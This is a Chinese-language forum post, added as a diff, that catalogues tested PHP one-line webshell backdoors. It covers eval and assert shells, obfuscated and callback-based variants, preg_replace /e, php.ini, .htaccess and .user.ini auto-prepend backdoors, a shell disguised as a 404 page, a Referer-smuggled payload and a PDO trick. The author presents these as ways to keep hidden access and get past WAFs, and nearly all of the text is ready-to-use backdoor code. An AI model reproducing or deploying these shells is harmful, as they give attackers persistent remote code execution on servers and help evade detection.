@@ -1,0 +1,318 @@
+最近学习和搜集了不少的php一句话后门，发现真的是各种猥琐和奇葩，于是自己就做了一个简单的总结和分析，还是有点累，都一一测试过，希望和各位表哥们分享下，希望不足的地方表哥们也指出来，在这里感谢P神等大牛的参考文章又有就是要是有表哥觉得看着觉得不错，希望打赏点酒票，就算辛苦费吧
+
+
+<?php $_GET[a]($_GET[ b]);?>
+
+
+<?php @eval($_POST['cmd']);?>
+
+
+<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST[faith]);  ?>
+
+
+<?php 
+  
+$item['wind'] = 'assert'; 
+  
+$array[] = $item; 
+  
+$array[0]['wind']($_POST['faith']); //利用数组，曾经可过安全狗
+  
+?>
+
+
+<?php 
+@eval(file_get_contents('php://input')) 
+#php:// — 访问各个输入/输出流（I/O streams）,php://input 是个可以访问请求的原始数据的只读流
+?>
+
+
+<?php 
+ //创建并包含文件
+if(isset($_GET['faith'])){
+   $faith=base64_decode($_GET['faith']);
+   mud();
+}
+function mud(){
+$fp=fopen('content_batch_stye.html','w');
+file_put_contents('content_batch_stye.html',"<?php\r\n");
+file_put_contents('content_batch_stye.html',$faith,FILE_APPEND);
+fclose($fp);
+require 'content_batch_stye.html';}
+?>
+
+
+<?php 
+$filename=$_GET['faith'];
+include ($filename);
+ 
+?>
+
+
+
+<?php 
+$reg="c"."o"."p"."y";
+$reg($_POST['faith1'],$_POST['faith2']);
+ 
+?>
+
+
+
+<?php 
+call_user_func('assert', $_POST['faith']);
+call_user_func_array('assert', array($_REQUEST['faith']));
+#第二个函数的参数改为数组
+?>
+
+
+<?php $act = $_POST['act'];
+$payload = array($_POST['faith'],);
+array_filter($payload, base64_decode($act));
+#将数组中所有元素遍历并用指定函数处理
+#利用方式发送post包：act=YXNzZXJ0&faith=phpinfo();
+#类似array_filter，array_map也有同样功效
+ 
+?>
+
+
+<?php 
+$act = $_POST['act'];
+$payload = array('test',$_POST['faith']);
+uasort($payload, base64_decode($act));
+#php5.4.8+中的assert能够接受两个参数，类似的还有这些
+$e = $_REQUEST['e'];
+$arr = array('test' => 1, $_REQUEST['pass'] => 2);
+uksort($arr, $e);
+ 
+?>
+
+
+
+<?php 
+$act = $_REQUEST['act'];
+register_shutdown_function($act, $_REQUEST['faith']);
+#当我们的脚本执行完成或意外死掉导致PHP执行即将关闭时,我们的这个函数将会 被调用
+ 
+?>
+
+
+
+<?php 
+$e = $_REQUEST['e'];
+declare(ticks=1);
+register_tick_function ($e, $_REQUEST['pass']);
+#declare是PHP的流程控制结构
+ 
+?>
+
+
+
+
+php.ini后门，修改php.ini 
+[PHP] 纯文本查看 复制代码
+?
+1
+auto_prepend_file ="C:\phpStudy\WWW\ma.txt"
+创建任意格式文件，此处为ma.txt
+[PHP] 纯文本查看 复制代码
+?
+1
+<?php @eval($_POST['faith']) ?>
+
+此时任意文件均包含后门，访问test.php
+
+
+Preg_replace
+preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) 
+
+/e 修正符使 preg_replace() 在从subject匹配到满足pattern的时,会把replacement当作 PHP 代码执行 php5.5之后就废弃了修正符
+
+
+<?php preg_replace("/faith/e",$_POST['faith'],"faith");
+ 
+?>
+
+404变型版
+
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+<?php
+@preg_replace("/[faith]/e",$_POST['faith'],"faith");
+header('HTTP/1.1 404 Not Found');
+
+拼接版
+
+<?php 
+$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");
+ 
+?>
+
+ROT13编码版
+
+<?php 
+<?php
+($faith = $_POST['faith']) && @preg_replace('/faith/e','@'.str_rot13('riny').'($faith)', 'faith');
+//str_rot13('riny')经过ROT13编码就是eval
+?>
+ 
+?>
+
+回调函数版
+
+<?php 
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'] => '|.*|e',);
+array_walk_recursive($arr, $e, '');
+#array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。
+ 
+?>
+
+
+<?php 
+mb_ereg_replace('.*', $_REQUEST['faith'], '', 'e');
+#类似的
+ 
+?>
+
+
+.htaccess相关后门
+.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法
+子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令
+Order allow,deny
+allow from all
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+php_value auto_prepend_file .htaccess 
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+#<?php eval($_POST['universe']);
+#使用.htaccess让目录下所有文件包含后门，此例中为包含带有注释后门的.htaccess文件本身
+
+
+Order allow,deny
+allow from all
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+#php_value auto_prepend_file .htaccess 
+#<?php eval($_POST['universe']);
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+php_value highlight.comment '"><script>alert(1);</script>'
+#添加xss后门，实际情况替换xss平台的xss链接
+
+
+php_flag zend.multibyte 1 
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+php_value zend.script_encoding "UTF-7"
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+php_value auto_append_file .htaccess 
+[font=Consolas, Liberation Mono, Menlo, Courier, monospace] [/font]
+#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+Ads
+这个不知为何实测不成功
+
+
+user.ini文件后门，类似.htaccess
+以fastcgi运行的php都可以用这个方法作为后门。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：
+ 
+
+.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。
+.user.ini文件
+[PHP] 纯文本查看 复制代码
+?
+1
+<auto_prepend_file=ma.gif
+
+目录下任意php文件均含有后门
+
+
+Referer后门
+
+第一个文件向第二个文件发送将payload隐藏在referer中的请求，达到隐蔽代码执行，绕过部分waf的效果（据说部分）
+
+<?php 
+//要执行的代码
+$payload ='phpinfo();';
+$payload = base64_encode($payload);
+//构造referer,并添加payload
+$referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$payload }&h=&i=";
+//后门
+$url = 'http://localhost/2.php';
+//使用PHP的cURL库可以简单和有效地去抓网页
+//初始化cURL
+$ch = curl_init();
+//设置cURL参数
+$options = array(
+    CURLOPT_URL => $url,
+    CURLOPT_HEADER => FALSE,
+    CURLOPT_RETURNTRANSFER => TRUE,
+    CURLOPT_REFERER => $referer
+);
+//以数组的形式为一个curl设置会话参数
+curl_setopt_array($ch, $options);
+//执行会话
+echo curl_exec($ch);
+ 
+ 
+ 
+ 
+ 
+?>
+
+
+<?php 
+//从REFERER中提取payload，然后解码并执行payload
+parse_str($_SERVER['HTTP_REFERER'],$payload);
+if(reset($payload) == '10' && count($payload) == 9) {
+   eval(base64_decode(str_replace(" ", "+", implode(array_slice($payload, 6)))));
+}
+ 
+ 
+ 
+?>
+
+
+
+
+利用PDO::FETCH_FUNC特性留后门
+fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，这个真心不太懂，还有很多利用方式，有兴趣的大家自己去看看
+
+
+<?php 
+if(($db = @new PDO('sqlite::memory:')) && ($sql = strrev('TSOP_')) && ($sql = $$sql)) {
+        $stmt = @$db->query("SELECT '{$sql[faith]}'");
+        $result = @$stmt->fetchAll(PDO::FETCH_FUNC, str_rot13('nffreg'));
+}
+ 
+ 
+ 
+ 
+ 
+?>
+
+
+ob_start后门
+
+bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )
+
+当php执行echo,print的时候数据流经顺序：echo-> php buffer -> tcp buffer -> browser
+
+给ob_start参数传入一个字符串作为回调函数，回调函数在缓冲区被ob_flush()或者相似的函数影响时，或者在请求结束之际输出缓冲区内容被冲刷到浏览器时调用，而输出缓冲区的内容作为回调函数的参数， 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器
+
+
+<?php 
+<?php
+$sys='system';
+ob_start($sys);
+echo "$_GET[faith]";
+ob_end_flush(); 
+?>
+ 
+ 
+ 
+ 
+?>
+
+
+
+最后的一点总结：最后再次感谢P神等大牛的参考文章！怎么说的，这些一句话类型还算比较全，但是主要是通过eval，assert，preg_replace来进行代码执行,而隐蔽工作呢，我们则可以利用混淆，加密等方法，可以衍生出各个版本。还有就是waf吧，其实我们只要利用一些猥琐的回调函数来使用命令执行函数，就可以绕过一些waf,不过听表哥说最终调用compile_string函数被锁定了，好像能动态拦截，不真是真是假希望大家看了之后能够举一反三，对代码审计和维持访问也有不小的帮助，有不足的也欢迎补充，写这个还是有点累，希望满意的表哥赏点酒票，谢谢
